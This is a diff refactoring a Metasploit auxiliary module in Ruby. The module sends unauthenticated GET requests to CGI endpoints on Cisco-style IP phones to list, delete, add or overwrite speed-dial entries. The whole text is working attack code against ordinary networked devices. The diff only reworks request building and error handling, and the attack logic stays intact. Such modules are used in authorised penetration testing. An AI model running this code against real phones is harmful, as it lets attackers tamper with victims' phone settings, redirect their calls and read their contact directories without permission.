@@ -48,100 +48,133 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    uri = normalize_uri(target_uri.to_s)
-    mac = Rex::Text.uri_encode(datastore["MAC"])
-    name = Rex::Text.uri_encode(datastore["NAME"])
-    position = Rex::Text.uri_encode(datastore["POSITION"])
-    telno = Rex::Text.uri_encode(datastore["TELNO"])
-
+    mac = Rex::Text.uri_encode(datastore['MAC'])
+    name = Rex::Text.uri_encode(datastore['NAME'])
+    position = Rex::Text.uri_encode(datastore['POSITION'])
+    telno = Rex::Text.uri_encode(datastore['TELNO'])
 
     case action.name.upcase
       when 'MODIFY'
-        print_status("Deleting Speed Dial of the IP phone")
-        url=uri+"/phonespeeddialdelete.cgi?entry=#{position}&device=SEP#{mac}"
-        vprint_status("URL: "+url)
-        status,res=send_rcv(url)
-        if status != Exploit::CheckCode::Safe and res.body =~ /Deleted/
-          print_good("Speed Dial #{position} is deleted successfully")
-          print_status("Adding Speed Dial to the IP phone")
-          url=uri+"/phonespeedialadd.cgi?name=#{name}&telno=#{telno}&device=SEP#{mac}&entry=#{position}&mac=#{mac}"
-          vprint_status("URL: "+url)
-          status,res=send_rcv(url)
-          if status != Exploit::CheckCode::Safe and res.body =~ /Added/
-            print_good("Speed Dial #{position} is added successfully")
-          elsif res.body =~ /exist/
-            print_error("Speed Dial is exist, change the position or choose modify!")
+        print_status("#{peer} - Deleting Speed Dial of the IP phone")
+
+        vars_get = {
+          'entry' => "#{position}",
+          'device' => "SEP#{mac}"
+        }
+
+        status, res = send_rcv('phonespeeddialdelete.cgi', vars_get)
+
+        if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Deleted/
+          print_good("#{peer} - Speed Dial #{position} is deleted successfully")
+          print_status("#{peer} - Adding Speed Dial to the IP phone")
+
+          vars_get = {
+            'name' => "#{name}",
+            'telno' => "#{telno}",
+            'device' => "SEP#{mac}",
+            'entry' => "#{position}",
+            'mac' => "#{mac}"
+          }
+
+          status, res = send_rcv('phonespeedialadd.cgi', vars_get)
+
+          if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Added/
+            print_good("#{peer} - Speed Dial #{position} is added successfully")
+          elsif res && res.body =~ /exist/
+            print_error("#{peer} - Speed Dial is exist, change the position or choose modify!")
           else
-            print_error("Speed Dial couldn't add!")
+            print_error("#{peer} - Speed Dial couldn't add!")
           end
         else
-          print_error("Speed Dial is not found!")
+          print_error("#{peer} - Speed Dial is not found!")
         end
       when 'DELETE'
-        print_status("Deleting Speed Dial of the IP phone")
-        url=uri+"/phonespeeddialdelete.cgi?entry=#{position}&device=SEP#{mac}"
-        vprint_status("URL: "+url)
-        status,res=send_rcv(url)
-        if status != Exploit::CheckCode::Safe and res.body =~ /Deleted/
-          print_good("Speed Dial #{position} is deleted successfully")
+        print_status("#{peer} - Deleting Speed Dial of the IP phone")
+
+        vars_get = {
+          'entry' => "#{position}",
+          'device' => "SEP#{mac}"
+        }
+
+        status, res = send_rcv('phonespeeddialdelete.cgi', vars_get)
+
+        if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Deleted/
+          print_good("#{peer} - Speed Dial #{position} is deleted successfully")
         else
-          print_error("Speed Dial is not found!")
+          print_error("#{peer} - Speed Dial is not found!")
         end
+
       when 'ADD'
-        print_status("Adding Speed Dial to the IP phone")
-        url=uri+"/phonespeedialadd.cgi?name=#{name}&telno=#{telno}&device=SEP#{mac}&entry=#{position}&mac=#{mac}"
-        vprint_status("URL: "+url)
-        status,res=send_rcv(url)
-        if status != Exploit::CheckCode::Safe and res.body =~ /Added/
-          print_good("Speed Dial #{position} is added successfully")
-        elsif res.body =~ /exist/
-          print_error("Speed Dial is exist, change the position or choose modify!")
+        print_status("#{peer} - Adding Speed Dial to the IP phone")
+        vars_get = {
+          'name' => "#{name}",
+          'telno' => "#{telno}",
+          'device' => "SEP#{mac}",
+          'entry' => "#{position}",
+          'mac' => "#{mac}"
+        }
+        status, res = send_rcv('phonespeedialadd.cgi', vars_get)
+
+        if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Added/
+          print_good("#{peer} - Speed Dial #{position} is added successfully")
+        elsif res && res.body && res.body.to_s =~ /exist/
+          print_error("#{peer} - Speed Dial is exist, change the position or choose modify!")
         else
-          print_error("Speed Dial couldn't add!")
+          print_error("#{peer} - Speed Dial couldn't add!")
         end
     else
       print_status("Getting Speed Dials of the IP phone")
-      url=uri+"/speeddials.cgi?device=SEP#{mac}"
-      vprint_status("URL: "+url)
+      vars_get = {
+        'device' => "SEP#{mac}"
+      }
 
-      status,res=send_rcv(url)
-      parse(res) if status != Exploit::CheckCode::Safe
+      status, res = send_rcv('speeddials.cgi', vars_get)
+      parse(res) unless status == Exploit::CheckCode::Safe
     end
 
   end
 
-  def send_rcv(uri)
-    uri=normalize_uri(uri.to_s)
+  def send_rcv(uri, vars_get)
+    uri = normalize_uri(target_uri.to_s, uri.to_s)
     res = send_request_cgi(
       {
         'uri'    => uri,
         'method' => 'GET',
+        'vars_get' => vars_get
       })
 
-    if res and res.code == 200 and res.body =~ /Speed [D|d]ial/
-      return Exploit::CheckCode::Vulnerable,res
+    if res && res.code == 200 && res.body && res.body.to_s =~ /Speed [D|d]ial/
+      return Exploit::CheckCode::Vulnerable, res
     else
-      print_error("Target appears not vulnerable!")
-      return Exploit::CheckCode::Safe,res
+      print_error("#{peer} - Target appears not vulnerable!")
+      return Exploit::CheckCode::Safe, res
     end
   end
 
   def parse(res)
     doc = REXML::Document.new(res.body)
-    names=[]
-    phones=[]
+    names = []
+    phones = []
 
-    list=doc.root.get_elements("DirectoryEntry")
-    list.each {|lst|
-      xlist=lst.get_elements("Name")
+    list = doc.root.get_elements('DirectoryEntry')
+    list.each do |lst|
+      xlist = lst.get_elements('Name')
       xlist.each {|l| names << "#{l[0]}"}
-      xlist=lst.get_elements("Telephone")
+      xlist = lst.get_elements('Telephone')
       xlist.each {|l| phones << "#{l[0]}" }
-    }
+    end
+
     if names.size > 0
-      names.size.times{|i| print_good("Position: "+names[i].split(":")[0]+"\tName: "+names[i].split(":")[1]+"\t"+"Telephone: "+phones[i])}
+      names.size.times do |i|
+        info = ''
+        info << "Position: #{names[i].split(":")[0]}, "
+        info << "Name: #{names[i].split(":")[1]}, "
+        info << "Telephone: #{phones[i]}"
+
+        print_good("#{peer} - #{info}")
+      end
     else
-      print_status("No Speed Dial detected")
+      print_status("#{peer} - No Speed Dial detected")
     end
   end
 end
